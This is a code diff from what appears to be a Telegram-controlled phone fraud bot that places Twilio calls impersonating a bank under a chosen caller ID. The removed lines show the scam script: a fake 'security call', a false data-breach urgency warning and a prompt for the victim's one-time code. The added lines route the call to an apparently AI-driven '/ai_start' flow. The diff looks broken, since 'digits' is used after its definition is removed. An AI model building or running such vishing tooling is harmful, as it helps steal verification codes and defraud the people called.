@@ -34,7 +34,7 @@ except Exception:
     ConversationHandler = None
     PTB_AVAILABLE = False
 
-from config import TWILIO_PHONE_NUMBER, NGROK_URL
+from config import TWILIO_PHONE_NUMBER, NGROK_URL, USE_AI_FLOW
 from urllib.parse import quote_plus
 from core.files import (
     read_user_file, write_user_file, set_user_state, get_user_state,
@@ -159,7 +159,14 @@ def initiate_call_compat(chat_id: int, user_id: str, call_from_user):
 
         phone = read_user_file(user_id, "phonenum.txt", "")
         caller_id = read_user_file(user_id, "Caller ID.txt", TWILIO_PHONE_NUMBER)
-        webhook_url = f"{NGROK_URL}/voice?user_id={user_id}&chat_id={chat_id}&emotion={emotion}"
+        webhook_url = (
+            f"{NGROK_URL.rstrip('/')}/ai_start"
+            f"?user_id={user_id}"
+            f"&chat_id={chat_id}"
+            f"&emotion={emotion}"
+            f"&call_type=normal"
+            f"&mode_label=Normal%20Call"
+        )
 
         # Ensure the async AMD callback includes user_id and chat_id so
         # the central Flask AMD handler can notify the correct Telegram chat.
@@ -796,43 +803,27 @@ async def initiate_call_from_query(query, user_id: str):
             )
             return
 
-    digits = read_user_file(user_id, "Digits.txt", "6")
-    script = build_script(user_id, int(digits))
-    script = get_script_variant(script)
-    write_user_file(user_id, "custom_script.txt", script)
-
     voice_id = read_user_file(user_id, "Voice.txt", get_default_voice_id())
     emotion = read_user_file(user_id, "emotion.txt", "neutral")
 
     name = read_user_file(user_id, "Name.txt", "Customer")
     company = read_user_file(user_id, "Company Name.txt", "your bank")
-    check_text = f"Hello, this is a security call from {company}. Please press 1 to continue."
-    explain_text = f"Thank you. We have detected suspicious activity on your account and need to verify some details."
-    askdigits_text = f"Please enter the {digits} digit code sent to you."
-
-    # generate required audio assets
-    await generate_ai(user_id, check_text, "checkifhuman", voice_id, emotion)
-    await generate_ai(user_id, explain_text, "explain", voice_id, emotion)
-    await generate_ai(user_id, askdigits_text, "askdigits", voice_id, emotion)
-
-    # Pre-generate the normal human flow audio so /normal_advanced_flow can return quickly.
-    try:
-        from bot import generate_call_audio
-        greeting = f"This is a message from {company}. This message is for {name}."
-        urgency = (
-            "Due to a national data breach, your account is at risk and we need to verify your details. "
-            "Failure to verify your account may result in temporary or permanent closure."
-        )
-        prompt = "Please press 1 to continue the verification process."
-        generate_call_audio(user_id, greeting, "normal_ultimate_greeting.mp3", max_retries=0)
-        generate_call_audio(user_id, urgency, "normal_ultimate_urgency.mp3", max_retries=0)
-        generate_call_audio(user_id, prompt, "normal_ultimate_press1.mp3", max_retries=0)
-    except Exception:
-        pass
-
     phone = read_user_file(user_id, "phonenum.txt", "")
     caller_id = read_user_file(user_id, "Caller ID.txt", TWILIO_PHONE_NUMBER)
-    webhook_url = f"{NGROK_URL}/voice?user_id={user_id}&chat_id={chat_id}&emotion={emotion}"
+
+    webhook_url = (
+        f"{NGROK_URL.rstrip('/')}/ai_start"
+        f"?user_id={quote_plus(str(user_id))}"
+        f"&chat_id={quote_plus(str(chat_id))}"
+        f"&name={quote_plus(name)}"
+        f"&company={quote_plus(company)}"
+        f"&voice_id={quote_plus(voice_id)}"
+        f"&emotion={quote_plus(emotion)}"
+        f"&code_length={quote_plus(str(digits))}"
+        f"&caller_id={quote_plus(caller_id)}"
+        f"&call_type=normal"
+        f"&mode_label=Normal%20Call"
+    )
 
     try:
         # Ensure AMD callback contains user/chat so the handler can correlate
